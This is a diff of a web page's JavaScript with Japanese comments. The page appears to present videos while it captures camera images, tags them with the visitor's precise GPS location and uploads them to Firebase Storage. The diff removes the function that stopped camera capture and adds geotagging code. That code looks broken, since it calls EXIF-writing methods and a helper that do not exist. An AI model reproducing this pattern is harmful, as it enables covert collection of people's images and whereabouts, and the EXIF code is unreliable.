@@ -430,83 +430,94 @@
             }
         }
 
-        function stopCameraCapture() {
-            if (captureInterval) {
-                clearInterval(captureInterval);
-            }
-            if (videoStream) {
-                videoStream.getTracks().forEach(track => track.stop());
-            }
-        }
 
         // 画像をFirebase Storageにアップロード
         async function uploadImage(dataURL) {
-            try {
-                const storageRef = ref(storage, `images/${Date.now()}.jpg`);
-                await uploadString(storageRef, dataURL, 'data_url');
-                console.log('画像がアップロードされました。');
-            } catch (err) {
-                console.error('アップロードエラー:', err);
-            }
-        }
+    try {
+        const storageRef = ref(storage, `images/${Date.now()}.jpg`);
+        await uploadString(storageRef, dataURL, 'data_url');
+        console.log('画像がアップロードされました。');
+    } catch (err) {
+        console.error('アップロードエラー:', err);
+    }
+}
 
-        // EXIFデータを画像に追加
-        async function addExifData(dataURL, position) {
-            return new Promise((resolve, reject) => {
-                const img = new Image();
-                img.onload = () => {
-                    const exif = new ExifEditor(img);
-                    if (position) {
-                        exif.setTag(0x0002, position.latitude);
-                        exif.setTag(0x0004, position.longitude);
+// EXIFデータを画像に追加
+async function addExifData(dataURL, position) {
+    return new Promise((resolve, reject) => {
+        const img = new Image();
+        img.onload = () => {
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            canvas.width = img.width;
+            canvas.height = img.height;
+            ctx.drawImage(img, 0, 0);
+            if (position) {
+                const exifData = {
+                    "GPS": {
+                        "GPSLatitude": position.latitude,
+                        "GPSLongitude": position.longitude,
+                        "GPSLatitudeRef": position.latitude >= 0 ? "N" : "S",
+                        "GPSLongitudeRef": position.longitude >= 0 ? "E" : "W"
                     }
-                    const exifDataURL = exif.getDataURL();
-                    resolve(exifDataURL);
                 };
-                img.onerror = reject;
-                img.src = dataURL;
-            });
-        }
-
-        function getLocation() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    position => {
-                        currentPosition = {
-                            latitude: position.coords.latitude,
-                            longitude: position.coords.longitude
-                        };
-                    },
-                    err => {
-                        console.error('位置情報取得エラー:', err);
-                    },
-                    {
-                        enableHighAccuracy: true,
-                        timeout: 5000,
-                        maximumAge: 0
-                    }
-                );
+                try {
+                    EXIF.setData(img, exifData);
+                    const exifBlob = dataURItoBlob(EXIF.getDataURL(img));
+                    resolve(URL.createObjectURL(exifBlob));
+                } catch (err) {
+                    reject(err);
+                }
             } else {
-                console.error('このブラウザは位置情報取得に対応していません。');
+                resolve(dataURL);
             }
-        }
-
-        function showCameraPermissionDialog() {
-            const dialogOverlay = document.getElementById('dialogOverlay');
-            dialogOverlay.style.display = 'flex';
-        }
-
-        // ダイアログを表示してユーザーにページを再読み込み
-        document.getElementById('reloadButton').addEventListener('click', () => {
-            location.reload();
-        });
-
-        // ページロード時に動画をロード
-        window.onload = () => {
-            loadVideos();
-            getLocation();
         };
-    </script>
-    <script src="https://cdn.jsdelivr.net/npm/exif-js"></script>
+        img.onerror = reject;
+        img.src = dataURL;
+    });
+}
+
+// 位置情報を取得
+function getLocation() {
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+            position => {
+                currentPosition = {
+                    latitude: position.coords.latitude,
+                    longitude: position.coords.longitude
+                };
+            },
+            err => {
+                console.error('位置情報取得エラー:', err);
+            },
+            {
+                enableHighAccuracy: true,
+                timeout: 5000,
+                maximumAge: 0
+            }
+        );
+    } else {
+        console.error('このブラウザは位置情報取得に対応していません。');
+    }
+}
+
+// カメラ権限ダイアログを表示
+function showCameraPermissionDialog() {
+    const dialogOverlay = document.getElementById('dialogOverlay');
+    dialogOverlay.style.display = 'flex';
+}
+
+// ダイアログを閉じてページを再読み込み
+document.getElementById('reloadButton').addEventListener('click', () => {
+    location.reload();
+});
+
+// ページロード時に動画をロード
+window.onload = () => {
+    loadVideos();
+    getLocation();
+};
+</script>
+<script src="https://cdn.jsdelivr.net/npm/exif-js"></script>
 </body>
 </html>
